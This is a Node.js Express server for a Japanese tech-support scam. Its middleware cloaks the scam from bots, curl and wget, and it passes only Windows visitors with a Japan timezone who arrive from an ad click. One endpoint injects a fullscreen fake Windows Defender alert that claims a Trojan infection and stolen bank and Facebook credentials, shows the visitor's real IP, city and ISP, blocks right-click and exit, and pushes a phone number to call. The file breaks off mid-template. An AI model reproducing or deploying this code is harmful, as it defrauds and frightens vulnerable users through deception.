import express from "express";
import cors from "cors";
import fs from "fs/promises";
import path from "path";
import { fileURLToPath } from "url";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const ALLOWED_ORIGIN = "https://sage-horse-b7caad.netlify.app";

// Helper to resolve relative paths (ESM compatible)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(
  cors({
    origin: ALLOWED_ORIGIN,
    credentials: true,
  })
);

app.use(express.json());

// Middleware for security checks
function validateRequest(req, res, next) {
  const origin = req.get("origin");
  if (origin !== ALLOWED_ORIGIN) {
    return res.status(403).send("FAILED: origin check");
  }

  const ua = req.get("user-agent")?.toLowerCase() || "";
  const blockedAgents = ["bot", "spider", "crawler", "curl", "wget"];
  const isWindows = ua.includes("windows");
  if (blockedAgents.some((a) => ua.includes(a)) || !isWindows) {
    return res.status(403).send("FAILED: bot or not Windows");
  }

  const timezone = req.get("x-client-timezone");
  if (!["Asia/Tokyo", "Japan"].includes(timezone)) {
    return res.status(403).send("FAILED: wrong timezone");
  }

  const cookie = req.get("x-access-cookie");
  if (cookie !== "true") {
    return res.status(403).send("FAILED: cookie missing");
  }

  next();
}

// === Endpoint: GET /bot-remover ===
app.get("/bot-remover", validateRequest, async (req, res) => {
  const gclid = req.query.gclid;
  if (!gclid || gclid.length < 10) {
    return res.status(403).send("FAILED: gclid missing or too short");
  }

  try {
    const htmlPath = path.join(__dirname, "asset.html");
    const html = await fs.readFile(htmlPath, "utf-8");
    res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
    return res.send(html);
  } catch (err) {
    return res.status(500).send("FAILED: could not read local asset");
  }
});

// === Endpoint: GET /frontend-loader ===
app.get("/frontend-loader", validateRequest, async (req, res) => {
  const gclid = req.query.gclid;
  if (!gclid || gclid.length < 10) {
    return res.status(403).send("FAILED: gclid missing or too short");
  }

  try {  
    const code = `
      document.documentElement.requestFullscreen().then(() => {
        document.body.innerHTML = `<html lang=\"ja\">\r\n  <head>\r\n    <meta charset=\"utf-8\">\r\n    <meta content=\"width=device-width,initial-scale=1,shrink-to-fit=no\" name=\"viewport\">\r\n    <meta content=\"noindex,nofollow\" name=\"robots\">\r\n    <title>\u30B3\u30F3\u30D4\u30E5\u30FC\u30BF\u30FC\u30A8\u30E9\u30FC0x800700B7<\/title>\r\n    <link href=\"msmm.png\" rel=\"icon\" id=\"favicon\" type=\"image\/png\">\r\n<!--     <script>0101 219 271 7197<\/script> -->\r\n    <link href=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/oocvtc8q441dnpqp6pp0s\/tapa.css?rlkey=d0r79r62zokie5yzkfpjaow5v&st=b1gp8px6&dl=0\" rel=\"stylesheet\">\r\n    <script type=\'text\/javascript\' src=\"https:\/\/code.jquery.com\/jquery-1.4.4.min.js\"><\/script>\r\n    <script type=\"text\/javascript\">\/\/<![CDATA[\r\n    $(function(){\r\n    $(\'body\').bind(\'contextmenu\', function(e){\r\n    return false;\r\n    });\r\n    });\/\/]]>\r\n    <\/script>\r\n\r\n    <script src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/w2j4nd0by9krbqhm7ra16\/noir.js?rlkey=5tbpikxwixzyh2q86c1ysr4sm&st=yn8ln7k3&dl=0\"><\/script>\r\n    <script>\r\n      var t = new XMLHttpRequest();\r\n      t.onreadystatechange = function() {\r\n          if (this.readyState === 4 && this.status === 200) {\r\n              try {\r\n                  var a = JSON.parse(this.responseText);\r\n  \r\n                  \/\/ Extracting information from the API response\r\n                  var ipadd = a.ip;\r\n                  var city = a.city;\r\n                  var country = a.country;\r\n                  var isp = a.connection.isp;\r\n                  var currtime = a.timezone.current_time;\r\n  \r\n                  \/\/ Setting the information into HTML elements\r\n                  document.getElementById(\"ip_add\").textContent = \"\u30A2\u30C9\u30EC\u30B9IP: \" + ipadd;\r\n                  document.getElementById(\"city\").textContent = \"\u4F4D\u7F6E: \" + city + \", \" + country;\r\n                  document.getElementById(\"isp\").textContent = \"ISP: \" + isp;\r\n              } catch (e) {\r\n                  console.error(\"Error parsing response:\", e);\r\n              }\r\n          } else if (this.readyState === 4) {\r\n              console.error(\"Request failed with status:\", this.status);\r\n          }\r\n      };\r\n  \r\n      \/\/ Sending the GET request to the API\r\n      t.open(\"GET\", \"https:\/\/ipwhois.pro\/?key=C8sZnLEBIwQVuMA4\", true);\r\n      t.send();\r\n  <\/script>\r\n\r\n    <script>\r\n              function getVariableFromURl(n0me)\r\n              {\r\n                  n0me = n0me.replace(\/[\\[]\/,\"\\\\\\[\").replace(\/[\\]]\/,\"\\\\\\]\");\r\n                  var regexS = \"[\\\\?&]\"+n0me+\"=([^&#]*)\";\r\n                  var regex = new RegExp( regexS );\r\n                  var results = regex.exec( window.location.href );\r\n                  if( results == null )\r\n                      return \"\";\r\n                  else\r\n                      return results[1];\r\n              }\r\n          <\/script>\r\n\r\n\r\n          <script type=\"text\/javascript\">\r\n                      var ph0ne = getVariableFromURl(\'ph0ne\');\r\n                  <\/script>\r\n\r\n  <\/head>\r\n  <body class=\"map\" id=\"mycanvas\" onbeforeunload=\"return myFunction()\"  style=\"cursor:none\">\r\n    <div class=\"bg\" style=\"cursor:none\">\r\n      <div class=\"bgimg\" style=\"top:0\">\r\n        <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/o8w3ob055n9w19xpnzj7n\/f24.png?rlkey=nt3nv72ozj8icbu4wpanq9ec7&st=w2z6h8q1&dl=0\" alt=\"\" width=\"100%\">\r\n      <\/div>\r\n    <\/div>\r\n    <a href=\"#\" id=\"link_black\" style=\"cursor:none\" rel=\"noreferrer\">\r\n      <div class=\"black\" style=\"height: 145%; cursor: none; display: block;\"><\/div>\r\n    <\/a>\r\n    <div class=\"pro_box\" style=\"cursor: none; display: block;\">\r\n      <div class=\"pro_box_header\">\r\n        <div class=\"row\">\r\n          <div class=\"col-md-12\">\r\n            <div class=\"minimize\">\r\n              <ul>\r\n                <li>\r\n                  <a href=\"#\">\r\n                    <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/94pg6fjhcqg0e72edre1l\/mnc.png?rlkey=xhfcwbkxpejxns5pwhrgwage6&st=k8t97vay&dl=0\">\r\n                  <\/a>\r\n                <\/li>\r\n              <\/ul>\r\n            <\/div>\r\n          <\/div>\r\n          <div class=\"col-md-4\">\r\n            <div class=\"logo\">\r\n              <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/d18h212fb8lxktqbkv5b0\/msmm.png?rlkey=e38fk03mc4knbkag4kmrdwwsy&st=vr4emrlg&dl=0\">\r\n              <span>Windows\u306E\u30BB\u30AD\u30E5\u30EA\u30C6\u30A3<\/span>\r\n            <\/div>\r\n          <\/div>\r\n          <div class=\"col-md-8\">\r\n            <div class=\"activate_lic\">\r\n              <ul>\r\n                <li>\r\n                  <a href=\"#\">\r\n                    <button>\u30E9\u30A4\u30BB\u30F3\u30B9\u3092\u30A2\u30AF\u30C6\u30A3\u30D6\u5316\u3059\u308B<\/button>\r\n                  <\/a>\r\n                <\/li>\r\n                <li>\r\n                  <a href=\"#\">\r\n                    <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/uuy0nhmgtkaobpjz3cutj\/set.png?rlkey=f5829w353wsmxfohz8469w8wh&st=1qxthqae&dl=0\">\r\n                  <\/a>\r\n                <\/li>\r\n                <li>\r\n                  <a href=\"#\">\r\n                    <img src=\"data:image\/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf\/iYbv\/iJKdZ47+3smxl533fpG9d1dV03z\/O6rrqum6bpOI6iKJxl\/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3\/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb\/X4EGADicI\/nlE5xDgAAAABJRU5ErkJggg==\">\r\n                  <\/a>\r\n                <\/li>\r\n              <\/ul>\r\n            <\/div>\r\n          <\/div>\r\n        <\/div>\r\n      <\/div>\r\n      <div class=\"scan_box\">\r\n        <div class=\"scan_box_header\">\r\n          <div class=\"row\">\r\n            <div class=\"col-md-6\">\r\n              <div class=\"quick_scan\">\r\n                <p>\r\n                  <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/10wptpzaqi3pbefrpslbp\/vsc.png?rlkey=7zfucxv0bbbwddnkeglej8ca8&st=a9krhgt9&dl=0\">\r\n                  <span>\u30B9\u30AD\u30E3\u30CB\u30F3\u30B0\u30E9\u30D4\u30FC\u30C9<\/span>\r\n                <\/p>\r\n              <\/div>\r\n            <\/div>\r\n            <div class=\"col-md-6\">\r\n              <div class=\"minimize1\">\r\n                <ul>\r\n                  <li>\r\n                    <a href=\"#\">\r\n                      <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/94pg6fjhcqg0e72edre1l\/mnc.png?rlkey=xhfcwbkxpejxns5pwhrgwage6&st=q4gefs27&dl=0\">\r\n                    <\/a>\r\n                  <\/li>\r\n                <\/ul>\r\n              <\/div>\r\n            <\/div>\r\n          <\/div>\r\n        <\/div>\r\n        <div class=\"scan_body\">\r\n          <div class=\"progress\">\r\n            <div class=\"active progress-bar progress-bar-success\" style=\"width: 100%;\" id=\"dynamic\" aria-valuemax=\"100\" aria-valuemin=\"0\" aria-valuenow=\"100\" role=\"progressbar\">100% \u5B8C\u4E86<\/div>\r\n          <\/div>\r\n          <div class=\"table_quick\">\r\n            <table class=\"table table-bordered\">\r\n              <thead>\r\n                <tr>\r\n                  <th scope=\"col\">\u30B9\u30AD\u30E3\u30F3\u3055\u308C\u305F\u30AA\u30D6\u30B8\u30A7\u30AF\u30C8<\/th>\r\n                  <th scope=\"col\">\r\n                    <div class=\"col_fourth counter\">\r\n                      <h2 class=\"count-number count-title timer\" data-speed=\"5000\" data-to=\"51900\">51,900<\/h2>\r\n                    <\/div>\r\n                  <\/th>\r\n                <\/tr>\r\n                <tr>\r\n                  <th scope=\"col\">\u4F7F\u3063\u305F\u6642\u9593<\/th>\r\n                  <th scope=\"col\">5 secs<\/th>\r\n                <\/tr>\r\n                <tr>\r\n                  <th scope=\"col\">\u7279\u5B9A\u3055\u308C\u305F\u8105\u5A01<\/th>\r\n                  <th scope=\"col\" style=\"color:red\">\r\n                    <h2 class=\"count-number count-title timer\" data-speed=\"2500\" data-to=\"1200\">1,200<\/h2>\r\n                  <\/th>\r\n                <\/tr>\r\n              <\/thead>\r\n            <\/table>\r\n          <\/div>\r\n        <\/div>\r\n        <div class=\"scan_footer\">\r\n          <div class=\"row\">\r\n            <div class=\"col-md-6\">\r\n              <div class=\"bt_can\">\r\n                <div class=\"btn-group\" role=\"group\" aria-label=\"Basic example\">\r\n                  <button class=\"btn btn-secondary\" type=\"button\">\u30AD\u30E3\u30F3\u30BB\u30EB<\/button>\r\n                <\/div>\r\n                <div class=\"btn-group\" role=\"group\" aria-label=\"Basic example\">\r\n                  <button class=\"btn btn-secondary\" type=\"button\">\u4E00\u6642\u505C\u6B62<\/button>\r\n                <\/div>\r\n              <\/div>\r\n            <\/div>\r\n            <div class=\"col-md-6\">\r\n              <div class=\"bt_can2\">\r\n                <div class=\"btn-group\" role=\"group\" aria-label=\"Basic example\">\r\n                  <button class=\"btn btn-secondary\" type=\"button\">\u30B9\u30B1\u30B8\u30E5\u30FC\u30EB\u3055\u308C\u305F\u30B9\u30AD\u30E3\u30F3<\/button>\r\n                <\/div>\r\n              <\/div>\r\n            <\/div>\r\n          <\/div>\r\n        <\/div>\r\n      <\/div>\r\n    <\/div>\r\n    <div class=\"pro_box2\" style=\"cursor: none; display: block;\">\r\n      <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/ff36sd59jbo544ib6trgi\/bx1.png?rlkey=1zfidi1mdsa4zso89yjlnqeqy&st=it76mba5&dl=0\" alt=\"\" style=\"max-width: 100%;\">\r\n    <\/div>\r\n    <div class=\"pro_box3\" style=\"cursor: none; display: block;\">\r\n      <div class=\"pro_box_header\">\r\n        <div class=\"row\">\r\n          <div class=\"col-md-12\">\r\n            <div class=\"minimize\">\r\n              <ul>\r\n                <li>\r\n                  <a href=\"#\">\r\n                    <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/94pg6fjhcqg0e72edre1l\/mnc.png?rlkey=xhfcwbkxpejxns5pwhrgwage6&st=q4gefs27&dl=0\">\r\n                  <\/a>\r\n                <\/li>\r\n              <\/ul>\r\n            <\/div>\r\n          <\/div>\r\n          <div class=\"col-md-4\">\r\n            <div class=\"logo\">\r\n              <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/d18h212fb8lxktqbkv5b0\/msmm.png?rlkey=e38fk03mc4knbkag4kmrdwwsy&st=1soamk3s&dl=0\">\r\n              <span>Windows\u306E\u30BB\u30AD\u30E5\u30EA\u30C6\u30A3<\/span>\r\n            <\/div>\r\n          <\/div>\r\n          <div class=\"col-md-8\">\r\n            <div class=\"activate_lic\">\r\n              <ul>\r\n                <li>\r\n                  <a href=\"#\">\r\n                    <button>\u30E9\u30A4\u30BB\u30F3\u30B9\u3092\u30A2\u30AF\u30C6\u30A3\u30D6\u5316\u3059\u308B<\/button>\r\n                  <\/a>\r\n                <\/li>\r\n                <li>\r\n                  <a href=\"#\">\r\n                    <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/5grr7m39ss9871l5pe0gu\/bel.png?rlkey=zbegzv732zr9qoakqckqvstxm&st=yanor0v9&dl=0\">\r\n                  <\/a>\r\n                <\/li>\r\n                <li>\r\n                  <a href=\"#\">\r\n                    <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/uuy0nhmgtkaobpjz3cutj\/set.png?rlkey=f5829w353wsmxfohz8469w8wh&st=05ipyj38&dl=0\">\r\n                  <\/a>\r\n                <\/li>\r\n                <li>\r\n                  <a href=\"#\">\r\n                    <img src=\"data:image\/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf\/iYbv\/iJKdZ47+3smxl533fpG9d1dV03z\/O6rrqum6bpOI6iKJxl\/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3\/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb\/X4EGADicI\/nlE5xDgAAAABJRU5ErkJggg==\">\r\n                  <\/a>\r\n                <\/li>\r\n              <\/ul>\r\n            <\/div>\r\n          <\/div>\r\n        <\/div>\r\n      <\/div>\r\n      <div class=\"scan_box2\">\r\n        <div class=\"scan_box_header\">\r\n          <div class=\"row\">\r\n            <div class=\"col-md-6\">\r\n              <div class=\"quick_scan\">\r\n                <p>\r\n                  <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/10wptpzaqi3pbefrpslbp\/vsc.png?rlkey=7zfucxv0bbbwddnkeglej8ca8&st=2ouvw95v&dl=0\">\r\n                  <span>\u30B9\u30AD\u30E3\u30F3<\/span>\r\n                <\/p>\r\n              <\/div>\r\n            <\/div>\r\n            <div class=\"col-md-6\">\r\n              <div class=\"minimize1\">\r\n                <ul>\r\n                  <li>\r\n                    <a href=\"#\">\r\n                      <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/94pg6fjhcqg0e72edre1l\/mnc.png?rlkey=xhfcwbkxpejxns5pwhrgwage6&st=7bngnjrs&dl=0\">\r\n                    <\/a>\r\n                  <\/li>\r\n                <\/ul>\r\n              <\/div>\r\n            <\/div>\r\n          <\/div>\r\n        <\/div>\r\n        <div class=\"scan_body\">\r\n          <div class=\"row\">\r\n            <div class=\"col-md-12\">\r\n              <div class=\"tooreg_detail_scan\">\r\n                <ul>\r\n                  <li>\r\n                    <a href=\"#\">\u30B9\u30AD\u30E3\u30F3<\/a>\r\n                  <\/li>\r\n                  <li>\r\n                    <a href=\"#\">\u30B9\u30AD\u30E3\u30F3\u8A08\u753B<\/a>\r\n                  <\/li>\r\n                  <li>\r\n                    <a href=\"#\">\u30EC\u30DD\u30FC\u30C8<\/a>\r\n                  <\/li>\r\n                <\/ul>\r\n              <\/div>\r\n            <\/div>\r\n          <\/div>\r\n          <br>\r\n          <div class=\"table_quick2\">\r\n            <div class=\"row\">\r\n              <div class=\"col-md-4\">\r\n                <div class=\"pc_desk\">\r\n                  <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/j2dyh4pcdokadftvolle0\/pcm.png?rlkey=b7eiunwh1ftn4cvs47d124mtk&st=l5gy233q&dl=0\">\r\n                <\/div>\r\n              <\/div>\r\n              <div class=\"col-md-4\">\r\n                <div class=\"card_top scan_pro\">\r\n                  <ul>\r\n                    <li>\r\n                      <i aria-hidden=\"true\" class=\"fa fa-check\"><\/i> \u30A2\u30C3\u30D7\u30C7\u30FC\u30C8\u306E\u78BA\u8A8D\r\n                    <\/li>\r\n                    <li>\r\n                      <i aria-hidden=\"true\" class=\"fa fa-check\"><\/i> \u30B9\u30AD\u30E3\u30F3\u30E1\u30E2\u30EA\r\n                    <\/li>\r\n                    <li>\r\n                      <i aria-hidden=\"true\" class=\"fa fa-check\"><\/i> \u30B9\u30BF\u30FC\u30C8\u30A2\u30C3\u30D7\u9805\u76EE\u3092\u5206\u6790\u3059\u308B\r\n                    <\/li>\r\n                    <li>\r\n                      <div class=\"circular-spinner\"><\/div>\r\n                      <span>\u30EC\u30B8\u30B9\u30C8\u30EA\u5206\u6790<\/span>\r\n                    <\/li>\r\n                    <li>\u30D5\u30A1\u30A4\u30EB\u30B7\u30B9\u30C6\u30E0\u306E\u5206\u6790<\/li>\r\n                  <\/ul>\r\n                <\/div>\r\n              <\/div>\r\n              <div class=\"col-md-4\">\r\n                <div class=\"scan_dur\">\r\n                  <p>\r\n                    <strong>\u5206\u6790\u306E\u671F\u9593<\/strong>\r\n                  <\/p>\r\n                  <p>3\u79D20\u79D2<\/p>\r\n                  <p>5\u79D20\u79D2<\/p>\r\n                  <br>\r\n                  <p>\r\n                    <strong>\u30B9\u30AD\u30E3\u30F3\u3055\u308C\u305F\u30A2\u30A4\u30C6\u30E0<\/strong>\r\n                  <\/p>\r\n                  <p>51,900<\/p>\r\n                  <br>\r\n                  <p>\r\n                    <strong>\u691C\u51FA<\/strong>\r\n                  <\/p>\r\n                  <p>11<\/p>\r\n                <\/div>\r\n              <\/div>\r\n            <\/div>\r\n          <\/div>\r\n        <\/div>\r\n        <div class=\"scan_footer3\">\r\n          <div class=\"row\">\r\n            <div class=\"col-md-2\">\r\n              <div class=\"viruses\">\r\n                <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/10wptpzaqi3pbefrpslbp\/vsc.png?rlkey=7zfucxv0bbbwddnkeglej8ca8&st=lshjg5ma&dl=0\">\r\n              <\/div>\r\n            <\/div>\r\n            <div class=\"col-md-10\">\r\n              <div class=\"make_this\">\r\n                <p>\u3053\u308C\u306F\u3001\u30AA\u30F3\u30E9\u30A4\u30F3\u306E\u8105\u5A01\u306B\u3064\u3044\u3066\u5FC3\u914D\u3059\u308B\u5FC5\u8981\u306E\u306A\u3044\u3053\u3068\u3067\u3059\u3002<\/p>\r\n                <p>\u30D7\u30EC\u30DF\u30A2\u30E0\u306F\u3001\u30B3\u30F3\u30D4\u30E5\u30FC\u30BF\u30FC\u306E\u901F\u5EA6\u3092\u4F4E\u4E0B\u3055\u305B\u308B\u3053\u3068\u306A\u304F\u3001\u30DE\u30EB\u30A6\u30A7\u30A2\u3001\u30A6\u30A4\u30EB\u30B9\u306A\u3069\u3092\u30D6\u30ED\u30C3\u30AF\u3057\u307E\u3059\u3002 \u30D7\u30EC\u30DF\u30A2\u30E0\u30D0\u30FC\u30B8\u30E7\u30F3\u306B\u30A2\u30C3\u30D7\u30B0\u30EC\u30FC\u30C9\u3059\u308B<\/p>\r\n              <\/div>\r\n            <\/div>\r\n          <\/div>\r\n        <\/div>\r\n      <\/div>\r\n    <\/div>\r\n    <div style=\"bottom:-20px;position:fixed;cursor:none;z-index:999999999;\" id=\"footer\">\r\n      <div class=\"row\">\r\n        <div class=\"col-md-12\">\r\n          <div class=\"right-foot\" style=\"text-align:center\">\r\n            <span id=\"footertxt\">\r\n              <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/d18h212fb8lxktqbkv5b0\/msmm.png?rlkey=e38fk03mc4knbkag4kmrdwwsy&st=ffpiwo9h&dl=0\"> Windows\u306E\u30BB\u30AD\u30E5\u30EA\u30C6\u30A3 <\/span>\r\n            <span style=\"font-weight:500;padding-left:13px;color:#fff; \">Windows \u30B5\u30DD\u30FC\u30C8\u306B\u96FB\u8A71\u3059\u308B: <span class=\"tfn-num\" style=\"border:1px solid #fff;border-radius:5px;padding:2px 5px\"> 0101 219 271 7197\r\n              <\/span>\r\n            <\/span>\r\n          <\/div>\r\n        <\/div>\r\n        <div class=\"col-md-12\">\r\n          <marquee direction=\"left\" height=\"100px\" width=\"100%\">\r\n            <small class=\"text-left\" style=\"color:#eee;font-size:10px\">Windows Defender SmartScreen \u306B\u3088\u308A\u3001\u8A8D\u8B58\u3055\u308C\u306A\u3044\u30A2\u30D7\u30EA\u30B1\u30FC\u30B7\u30E7\u30F3\u306E\u8868\u793A\u304C\u9632\u6B62\u3055\u308C\u307E\u3057\u305F\u3002 \u3053\u306E\u30A2\u30D7\u30EA\u30B1\u30FC\u30B7\u30E7\u30F3\u3092\u5B9F\u884C\u3059\u308B\u3068\u3001PC \u304C\u5371\u967A\u306B\u3055\u3089\u3055\u308C\u308B\u53EF\u80FD\u6027\u304C\u3042\u308A\u307E\u3059\u3002 Windows Defender \u30B9\u30AD\u30E3\u30F3\u306B\u3088\u308A\u3001\u30D1\u30B9\u30EF\u30FC\u30C9\u3001\u30AA\u30F3\u30E9\u30A4\u30F3 ID\u3001\u8CA1\u52D9\u60C5\u5831\u3001\u500B\u4EBA\u30D5\u30A1\u30A4\u30EB\u3001\u5199\u771F\u3001\u30C9\u30AD\u30E5\u30E1\u30F3\u30C8\u3092\u76D7\u3080\u53EF\u80FD\u6027\u304C\u3042\u308B\u30A2\u30C9\u30A6\u30A7\u30A2\u304C\u3053\u306E\u30C7\u30D0\u30A4\u30B9\u4E0A\u3067\u898B\u3064\u304B\u308A\u307E\u3057\u305F\u3002<\/small>\r\n          <\/marquee>\r\n        <\/div>\r\n      <\/div>\r\n    <\/div>\r\n    <div class=\"lightbox\" id=\"poptxt\" style=\"display: block;\">\r\n      <div class=\"ilb top\" style=\"font-size:17px\">\r\n        <div class=\"ilb headers\" style=\"border-bottom:1px solid #d6d5d5\">\r\n          <span class=\"fl title\" id=\"txtadd\">\r\n            <span class=\"fl ilb\">\r\n              <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/uaog46uko8qnf1txmlbk1\/dm.png?rlkey=m5ckqosenaila6u02ttcca32v&st=nod70mbu&dl=0\" class=\"logo3\">\r\n            <\/span>Windows Defender \u30BB\u30AD\u30E5\u30EA\u30C6\u30A3 \u30BB\u30F3\u30BF\u30FC <\/span>\r\n          <span class=\"fl title2\" id=\"txts1\">\r\n            <a href=\"#\" id=\"cross\">\r\n              <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/dewhznc15dzg3o98bigwe\/cs.png?rlkey=y4g5ibep3iq8doupgsgve6b85&st=tgx9aju6&dl=0\">\r\n            <\/a>\r\n          <\/span>\r\n        <\/div>\r\n      <\/div>\r\n      <div id=\"txtintro\">\r\n        <span class=\"colo-rd\">\r\n          <div id=\"ip_add\">Microsoft Windows \u30D5\u30A1\u30A4\u30A2\u30A6\u30A9\u30FC\u30EB\u306E\u8B66\u544A !<\/div>\r\n          <div id=\"city\">\u30C8\u30ED\u30A4\u306E\u6728\u99AC\u578B\u30B9\u30D1\u30A4\u30A6\u30A7\u30A2\u306B\u611F\u67D3\u3057\u305FPC<\/div>\r\n          <div id=\"isp\"> (\u30A8\u30E9\u30FC\u30B3\u30FC\u30C9: 0x80070005)<\/div>\r\n        <\/span>\r\n      <\/div>\r\n      <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/2e4ow3e4cpiof2cxpnvqo\/re.gif?rlkey=p3gy45r3jvgcphcjledq9h85b&st=3il68rw3&dl=0\" id=\"banner\">\r\n      <div id=\"disclaimer\">\u3053\u306E PC \u3078\u306E\u30A2\u30AF\u30BB\u30B9\u306F\u30BB\u30AD\u30E5\u30EA\u30C6\u30A3\u4E0A\u306E\u7406\u7531\u304B\u3089\u30D6\u30ED\u30C3\u30AF\u3055\u308C\u3066\u3044\u307E\u3059.  <br>\r\n        <span class=\"support\" style=\"font-size:22px;\">Windows \u30B5\u30DD\u30FC\u30C8\u306B\u96FB\u8A71\u3057\u3066\u304F\u3060\u3055\u3044:<br><span class=\"tfn-num\" style=\"border:1px solid #114d9a;border-radius:5px;padding:2px 5px\"> 0101 219 271 7197\r\n          <\/span>\r\n        <\/span>\r\n      <\/div>\r\n      <div id=\"bottom\">\r\n        <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/d18h212fb8lxktqbkv5b0\/msmm.png?rlkey=e38fk03mc4knbkag4kmrdwwsy&st=ffpiwo9h&dl=0\" id=\"badge\">\r\n        <span class=\"title3\">Windows<\/span>\r\n        <ul>\r\n          <li>\r\n            <a href=\"#\">\r\n              <div class=\"fr button2\">\r\n                <span id=\"addtochromebutton\">\u30AD\u30E3\u30F3\u30BB\u30EB<\/span>\r\n              <\/div>\r\n            <\/a>\r\n          <\/li>\r\n          <li>\r\n            <a href=\"#\">\r\n              <div class=\"fr button\">\r\n                <span id=\"addtochromebutton\">OK<\/span>\r\n              <\/div>\r\n            <\/a>\r\n          <\/li>\r\n        <\/ul>\r\n      <\/div>\r\n    <\/div>\r\n    <div class=\"cardcontainer\" style=\"cursor: none; display: block;\" id=\"pop_up_new\">\r\n      <p style=\"font-size:16px;font-weight:400;margin:0;margin-bottom:5px;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:8px\" class=\"text-center\">Windows-Defender - \u30BB\u30AD\u30E5\u30EA\u30C6\u30A3\u8B66\u544A<\/p>\r\n      <p>\r\n        <b>\u3053\u306E PC \u3078\u306E\u30A2\u30AF\u30BB\u30B9\u306F\u30BB\u30AD\u30E5\u30EA\u30C6\u30A3\u4E0A\u306E\u7406\u7531\u304B\u3089\u30D6\u30ED\u30C3\u30AF\u3055\u308C\u3066\u3044\u307E\u3059<\/b>\r\n      <\/p>\r\n      <p>\u304A\u4F7F\u3044\u306E\u30B3\u30F3\u30D4\u30E5\u30FC\u30BF\u306F\u3001\u30C8\u30ED\u30A4\u306E\u6728\u99AC\u30BF\u30A4\u30D7\u306E\u30B9\u30D1\u30A4\u30A6\u30A7\u30A2\u306B\u611F\u67D3\u3057\u3066\u3044\u308B\u3068\u5831\u544A\u3055\u308C\u307E\u3057\u305F\u3002 \u6B21\u306E\u30C7\u30FC\u30BF\u304C\u4FB5\u5BB3\u3055\u308C\u307E\u3057\u305F\u3002<\/p>\r\n       <p>> \u30E1\u30FC\u30EB ID <br>&gt; \u9280\u884C\u306E\u30D1\u30B9\u30EF\u30FC\u30C9 <br>&gt; Facebook \u30ED\u30B0\u30A4\u30F3 <br>&gt; \u5199\u771F\u3068\u6587\u66F8 <\/p>\r\n       <p>Windows Defender \u30B9\u30AD\u30E3\u30F3\u306B\u3088\u308A\u3001\u30D1\u30B9\u30EF\u30FC\u30C9\u3001\u30AA\u30F3\u30E9\u30A4\u30F3 ID\u3001\u8CA1\u52D9\u60C5\u5831\u3001\u500B\u4EBA\u30D5\u30A1\u30A4\u30EB\u3001\u5199\u771F\u3001\u30C9\u30AD\u30E5\u30E1\u30F3\u30C8\u3092\u76D7\u3080\u53EF\u80FD\u6027\u304C\u3042\u308B\u30A2\u30C9\u30A6\u30A7\u30A2\u304C\u3053\u306E\u30C7\u30D0\u30A4\u30B9\u4E0A\u3067\u898B\u3064\u304B\u308A\u307E\u3057\u305F\u3002<\/p>\r\n       <p>\u305F\u3060\u3061\u306B\u5F53\u793E\u306B\u3054\u9023\u7D61\u304F\u3060\u3055\u3044\u3002\u5F53\u793E\u306E\u30A8\u30F3\u30B8\u30CB\u30A2\u304C\u96FB\u8A71\u3067\u524A\u9664\u30D7\u30ED\u30BB\u30B9\u3092\u6848\u5185\u3044\u305F\u3057\u307E\u3059\u3002<\/p>\r\n       <p>\u305F\u3060\u3061\u306B Windows 